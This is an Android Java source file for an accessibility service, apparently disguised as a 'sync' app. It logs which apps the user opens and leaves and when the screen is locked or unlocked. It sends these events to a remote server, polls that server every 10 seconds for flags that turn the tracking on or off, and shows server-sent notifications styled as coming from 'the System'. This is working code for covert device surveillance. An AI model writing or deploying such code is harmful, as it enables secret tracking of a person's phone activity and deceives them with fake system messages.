package com.a54.sync;

import android.accessibilityservice.AccessibilityService;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityEvent;

public class MonitorAccessibilityService extends AccessibilityService {

    private boolean isScreenUnlocked = true;
    private String currentForegroundApp = "Màn hình chính";
    private String lastActiveApp = "";

    private BroadcastReceiver screenReceiver;
    private Handler handler = new Handler(Looper.getMainLooper());
    private Runnable syncRunnable;
    private long lastIntervalReportTime = 0;
    private static final long INTERVAL_90_MIN = 90 * 60 * 1000L;

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        lastIntervalReportTime = System.currentTimeMillis();

        IntentFilter filter = new IntentFilter();
        filter.addAction(Intent.ACTION_USER_PRESENT);
        filter.addAction(Intent.ACTION_SCREEN_OFF);

        screenReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                String action = intent.getAction();
                SharedPreferences prefs = getSharedPreferences("A54Prefs", MODE_PRIVATE);

                if (Intent.ACTION_USER_PRESENT.equals(action)) {
                    isScreenUnlocked = true;
                    lastActiveApp = "";
                    if (prefs.getBoolean("f1_unlock", false)) {
                        ApiClient.postEvent("session_state", "status", "Mở khóa màn hình (Bắt đầu phiên)");
                    }
                } else if (Intent.ACTION_SCREEN_OFF.equals(action)) {
                    if (isScreenUnlocked && prefs.getBoolean("f1_unlock", false)) {
                        if (!lastActiveApp.isEmpty()) {
                            ApiClient.postEvent("app_transition", "status", "Thoát ứng dụng: " + lastActiveApp);
                        }
                        ApiClient.postEvent("session_state", "status", "Khóa màn hình (Kết thúc phiên)");
                    }
                    isScreenUnlocked = false;
                    lastActiveApp = "";
                }
            }
        };
        registerReceiver(screenReceiver, filter);

        syncRunnable = new Runnable() {
            @Override
            public void run() {
                ApiClient.syncWithServer(MonitorAccessibilityService.this, new ApiClient.SyncCallback() {
                    @Override
                    public void onSyncResult(boolean f1, boolean f2, boolean f3, String pendingNotif) {
                        SharedPreferences prefs = getSharedPreferences("A54Prefs", MODE_PRIVATE);
                        prefs.edit()
                                .putBoolean("f1_unlock", f1)
                                .putBoolean("f2_interval", f2)
                                .putBoolean("f3_notif", f3)
                                .apply();

                        long now = System.currentTimeMillis();
                        if (f2 && (now - lastIntervalReportTime >= INTERVAL_90_MIN)) {
                            lastIntervalReportTime = now;
                            ApiClient.postEvent("interval_90m", "app_name", currentForegroundApp);
                        }

                        if (f3 && pendingNotif != null && !pendingNotif.isEmpty()) {
                            showCustomNotification(pendingNotif);
                        }
                    }
                });
                handler.postDelayed(this, 10000);
            }
        };
        handler.post(syncRunnable);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED && event.getPackageName() != null) {
            String pkg = event.getPackageName().toString();

            if (pkg.contains("systemui") ||
                pkg.contains("inputmethod") ||
                pkg.equals("com.a54.sync") ||
                pkg.contains("miui.screenrecorder")) {
                return;
            }

            SharedPreferences prefs = getSharedPreferences("A54Prefs", MODE_PRIVATE);

            if (pkg.contains("launcher") || pkg.contains("miui.home")) {
                currentForegroundApp = "Màn hình chính (" + pkg + ")";
                if (isScreenUnlocked && prefs.getBoolean("f1_unlock", false) && !lastActiveApp.isEmpty()) {
                    ApiClient.postEvent("app_transition", "status", "Thoát ứng dụng: " + lastActiveApp + " -> Về Màn hình chính");
                    lastActiveApp = "";
                }
                return;
            }

            String appName = getReadableAppName(pkg);
            currentForegroundApp = appName;

            if (isScreenUnlocked && prefs.getBoolean("f1_unlock", false)) {
                if (!appName.equals(lastActiveApp)) {
                    if (!lastActiveApp.isEmpty()) {
                        ApiClient.postEvent("app_transition", "status", "Thoát: " + lastActiveApp + " -> Chuyển sang: " + appName);
                    } else {
                        ApiClient.postEvent("app_transition", "status", "Mở ứng dụng: " + appName);
                    }
                    lastActiveApp = appName;
                }
            }
        }
    }

    private void showCustomNotification(String message) {
        String channelId = "a54_sync_channel";
        NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(channelId, "A54 Sync Notif", NotificationManager.IMPORTANCE_HIGH);
            nm.createNotificationChannel(channel);
        }

        int notifId = (int) (System.currentTimeMillis() % 10000);

        Intent clickIntent = new Intent(this, NotifActionReceiver.class);
        clickIntent.setAction("ACTION_NOTIF_CLICKED");
        clickIntent.putExtra("msg", message);
        PendingIntent clickPending = PendingIntent.getBroadcast(this, notifId, clickIntent, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);

        Intent dismissIntent = new Intent(this, NotifActionReceiver.class);
        dismissIntent.setAction("ACTION_NOTIF_DISMISSED");
        dismissIntent.putExtra("msg", message);
        PendingIntent dismissPending = PendingIntent.getBroadcast(this, notifId + 1, dismissIntent, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);

        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, channelId);
        } else {
            builder = new Notification.Builder(this);
        }

        builder.setSmallIcon(android.R.drawable.ic_dialog_info)
                .setContentTitle("Thông báo từ Hệ thống")
                .setContentText(message)
                .setAutoCancel(true)
                .setContentIntent(clickPending)
                .setDeleteIntent(dismissPending);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
            builder.setPriority(Notification.PRIORITY_HIGH);
            nm.notify(notifId, builder.build());
        } else {
            nm.notify(notifId, builder.getNotification());
        }
    }

    private String getReadableAppName(String pkg) {
        PackageManager pm = getPackageManager();
        try {
            ApplicationInfo ai = pm.getApplicationInfo(pkg, 0);
            CharSequence label = pm.getApplicationLabel(ai);
            return label != null ? label.toString() + " (" + pkg + ")" : pkg;
        } catch (Exception e) {
            return pkg;
        }
    }

    @Override
    public void onInterrupt() {}

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (screenReceiver != null) {
            try {
                unregisterReceiver(screenReceiver);
            } catch (Exception ignored) {}
        }
        if (handler != null && syncRunnable != null) {
            handler.removeCallbacks(syncRunnable);
        }
    }
}
